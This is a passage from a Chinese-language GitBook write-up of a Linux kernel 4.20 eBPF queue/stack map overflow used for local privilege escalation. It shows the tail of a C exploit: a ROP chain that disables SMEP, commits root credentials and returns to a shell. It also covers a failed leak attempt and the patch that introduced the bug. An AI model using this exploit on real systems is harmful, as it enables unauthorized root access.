    <span class="hljs-keyword">if</span>(rop_base &lt; <span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;[-] mmap failed!\n&quot;</span>);
    }

    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">uint64_t</span> rop[<span class="hljs-number">0x30</span>];
    rop[i++] = pop_rax_ret;      
    rop[i++] = <span class="hljs-number">0x6f0</span>;                   
    rop[i++] = native_write_cr4;
    rop[i++] = pop_rdi_ret;
    rop[i++] = <span class="hljs-number">0</span>;
    rop[i++] = (<span class="hljs-keyword">uint64_t</span> )prepare_kernel_cred;      
    rop[i++] = pop_rsi_ret;             
    rop[i++] = pop_rdi_ret;                     
    rop[i++] = push_rax_push_rsi;                      
    rop[i++] = (<span class="hljs-keyword">uint64_t</span> )commit_creds;           
    rop[i++] = swapgs_ret;                      
    rop[i++] = <span class="hljs-number">0</span>;
    rop[i++] = iretq;
    rop[i++] = (<span class="hljs-keyword">uint64_t</span> )&amp;shell;           
    rop[i++] = user_cs;                 
    rop[i++] = user_rflags;            
    rop[i++] = user_sp;                   
    rop[i++] = user_ss;                
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">void</span> *)(rop_base + <span class="hljs-number">0x75a</span>), &amp;rop, <span class="hljs-keyword">sizeof</span>(rop));

    <span class="hljs-keyword">uint64_t</span> xchg_esp = <span class="hljs-number">0xffffffff8101275a</span>; <span class="hljs-comment">// xchg eax, esp; ret;</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] xchg_esp: 0x%lx\n&quot;</span>, xchg_esp);

    fake_ops[<span class="hljs-number">2</span>] = xchg_esp;
    <span class="hljs-keyword">uint64_t</span> *fake_elements = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++){
        fake_elements[i] = i;
    }
    fake_elements[<span class="hljs-number">6</span>] = (<span class="hljs-keyword">uint64_t</span>)fake_ops;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] fake_elements: %p\n&quot;</span>, fake_elements);

    update_map(res, user_attr, (<span class="hljs-keyword">uint64_t</span>)fake_elements);

    close_map_fd();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x9996;&#x5148;&#x5206;&#x914D;&#x4E00;&#x4E2A;map&#xFF0C;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E4B;&#x540E;&#x5BF9;map&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#xFF0C;&#x8D8A;&#x754C;&#x5199;&#xFF0C;&#x8986;&#x76D6;elements[6] &#x4E3A;&#x4F2A;&#x9020;&#x7684;ops&#xFF0C;&#x8986;&#x76D6;map_release&#x51FD;&#x6570;&#x6307;&#x9488;&#x4E3A;rop&#x94FE;&#xFF08;&#x5207;&#x6362;&#x5230;&#x7528;&#x6237;&#x6808;&#xFF09;&#xFF0C;&#x4E4B;&#x540E;close map&#x4F1A;&#x89E6;&#x53D1;map_release&#xFF0C;&#x8C03;&#x7528;rop&#x94FE;&#xFF0C;&#x8FDB;&#x884C;&#x63D0;&#x6743;&#x3002;</p>
<h3 id="&#x5BF9;&#x8D8A;&#x754C;&#x8BFB;&#x7684;&#x5C1D;&#x8BD5;">&#x5BF9;&#x8D8A;&#x754C;&#x8BFB;&#x7684;&#x5C1D;&#x8BD5;</h3>
<p>&#x8BB2;&#x9053;&#x7406;&#x80FD;&#x591F;&#x8D8A;&#x754C;&#x8BBF;&#x95EE;elements&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x53EF;&#x4EE5;&#x8D8A;&#x754C;&#x8BFB;&#xFF0C;&#x6CC4;&#x9732;bpf_map_ops&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5F15;&#x5165;&#x7684;&#x8865;&#x4E01;&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;elements&#x7684;&#x5185;&#x5BB9;&#xFF1A;</p>
<pre><code class="lang-c">+static int __queue_map_get(struct bpf_map *map, void *value, bool delete)
+{
+    struct bpf_queue_stack *qs = bpf_queue_stack(map);
+    unsigned long flags;
+    int err = 0;
+    void *ptr;
+
+    raw_spin_lock_irqsave(&amp;qs-&gt;lock, flags);
+
+    if (queue_stack_map_is_empty(qs)) {
+        err = -ENOENT;
+        goto out;
+    }
+
+    ptr = &amp;qs-&gt;elements[qs-&gt;tail * qs-&gt;map.value_size];
+    memcpy(value, ptr, qs-&gt;map.value_size);
+
+    if (delete) {
+        if (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))
+            qs-&gt;tail = 0;
+    }
+
+out:
+    raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, flags);
+    return err;
+}
+
+
+static int __stack_map_get(struct bpf_map *map, void *value, bool delete)
+{
+    struct bpf_queue_stack *qs = bpf_queue_stack(map);
+    unsigned long flags;
+    int err = 0;
+    void *ptr;
+    u32 index;
+
+    raw_spin_lock_irqsave(&amp;qs-&gt;lock, flags);
+
+    if (queue_stack_map_is_empty(qs)) {
+        err = -ENOENT;
+        goto out;
+    }
+
+    index = qs-&gt;head - 1;
+    if (unlikely(index &gt;= qs-&gt;size))
+        index = qs-&gt;size - 1;
+
+    ptr = &amp;qs-&gt;elements[index * qs-&gt;map.value_size];
+    memcpy(value, ptr, qs-&gt;map.value_size);
+
+    if (delete)
+        qs-&gt;head = index;
+
+out:
+    raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, flags);
+    return err;
+}
+/* Called from syscall or from eBPF program */
+static int queue_map_peek_elem(struct bpf_map *map, void *value)
+{
+    return __queue_map_get(map, value, false);
+}
+
+/* Called from syscall or from eBPF program */
+static int stack_map_peek_elem(struct bpf_map *map, void *value)
+{
+    return __stack_map_get(map, value, false);
+}
</code></pre>
<p>&#x901A;&#x8FC7;&#x8C03;&#x7528;map_lookup_elem-&gt;map-&gt;ops-&gt;map_peek_elem-&gt;__queue_map_get &#xFF0C;&#x8C03;&#x7528;&#x5230;&#x4E0A;&#x8FF0;&#x8BFB;&#x53D6;elements&#x5185;&#x5BB9;&#x3002;</p>
<pre><code>case BPF_MAP_LOOKUP_ELEM:
        err = map_lookup_elem(&amp;attr);
        break;

else if (map-&gt;map_type == BPF_MAP_TYPE_QUEUE ||
           map-&gt;map_type == BPF_MAP_TYPE_STACK) {
        err = map-&gt;ops-&gt;map_peek_elem(map, value);
</code></pre><p>&#x7528;&#x6237;&#x6001;&#x4EE3;&#x7801;&#x4E3A;:</p>
<pre><code class="lang-c">user_attr-&gt;map_fd = res;
user_attr-&gt;key = <span class="hljs-number">0</span>;
user_attr-&gt;value = (<span class="hljs-keyword">uint64_t</span>)leak;
user_attr-&gt;flags = <span class="hljs-number">0</span>;
syscall(__NR_bpf, <span class="hljs-number">1</span>, user_attr, <span class="hljs-number">0x2c</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] leak : 0x%lx\n&quot;</span>, leak[<span class="hljs-number">0</span>]);
</code></pre>
<p>&#x4F46;&#x662F;&#x8FC7;&#x4E0D;&#x4E86;queue_stack_map_is_empty(qs) &#x7684;&#x5224;&#x65AD;&#xFF0C;&#x4E00;&#x5F00;&#x59CB;elments&#x4E3A;&#x7A7A;&#xFF0C;&#x4E0D;&#x8BA9;&#x8BFB;&#x53D6;&#xFF0C;&#x9700;&#x8981;&#x586B;&#x5145;&#x6570;&#x636E;&#x53BB;&#x8C03;&#x7528;map_update_elem&#xFF0C;&#x4F46;&#x7531;&#x4E8E;&#x5199;&#x6570;&#x636E;&#x7528;&#x7684;&#x662F;memcpy&#xFF0C;&#x76F4;&#x63A5;&#x590D;&#x5236;value_size&#x5927;&#x5C0F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x540E;&#x7EED;&#x8BFB;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x662F;&#x8BFB;&#x5230;&#x4E5F;&#x662F;update&#x8FDB;&#x53BB;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E4B;&#x524D;&#x7684;bpf_map_ops&#x7684;&#x5730;&#x5740;&#x5DF2;&#x7ECF;&#x88AB;&#x8986;&#x76D6;&#x4E86;&#xFF0C;&#x65E0;&#x6CD5;&#x6CC4;&#x9732;&#x3002;</p>
<h3 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;">&#x53C2;&#x8003;&#x94FE;&#x63A5;</h3>
<p><a href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E" target="_blank">http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E</a></p>
<p><a href="https://www.anquanke.com/post/id/166819#h3-5" target="_blank">https://www.anquanke.com/post/id/166819#h3-5</a></p>
<p><a href="https://github.com/ww9210/kernel4.20_bpf_LPE" target="_blank">https://github.com/ww9210/kernel4.20_bpf_LPE</a></p>
<p>&#x5F15;&#x5165;&#x6F0F;&#x6D1E;&#x7684;&#x8865;&#x4E01;&#xFF1A;
<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/kernel/bpf?id=f1a2e44a3aeccb3ff18d3ccc0b0203e70b95bd92" target="_blank">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/kernel/bpf?id=f1a2e44a3aeccb3ff18d3ccc0b0203e70b95bd92</a></p>
<p>commit&#xFF1A;f1a2e44a3aeccb3ff18d3ccc0b0203e70b95bd92</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"kernel4.20_BPF_LPE","level":"1.6.1","depth":2,"next":{"title":"[2017年]","level":"1.7","depth":1,"ref":"","articles":[{"title":"CVE-2017-16995 ebpf","level":"1.7.1","depth":2,"path":"_posts/CVE-2017-16995-ebpf.md","ref":"_posts/CVE-2017-16995-ebpf.md","articles":[]},{"title":"CVE-2017-5123 waitid","level":"1.7.2","depth":2,"path":"_posts/CVE-2017-5123-waitid.md","ref":"_posts/CVE-2017-5123-waitid.md","articles":[]},{"title":"CVE-2017-1000112 UFO","level":"1.7.3","depth":2,"path":"_posts/CVE-2017-1000112-UFO.md","ref":"_posts/CVE-2017-1000112-UFO.md","articles":[]},{"title":"CVE-2017-1000405 Huge Dirtycow","level":"1.7.4","depth":2,"path":"_posts/CVE-2017-1000405-Huge_Dirtycow.md","ref":"_posts/CVE-2017-1000405-Huge_Dirtycow.md","articles":[]},{"title":"CVE-2017-7184 xfrm_user","level":"1.7.5","depth":2,"path":"_posts/CVE-2017-7184-xfrm_user.md","ref":"_posts/CVE-2017-7184-xfrm_user.md","articles":[]}]},"previous":{"title":"[2018年]","level":"1.6","depth":1,"ref":"","articles":[{"title":"kernel4.20_BPF_LPE","level":"1.6.1","depth":2,"path":"_posts/kernel4.20_BPF_LPE.md","ref":"_posts/kernel4.20_BPF_LPE.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"_posts/kernel4.20_BPF_LPE.md","mtime":"2020-05-28T09:23:43.573Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-05-28T09:46:17.963Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

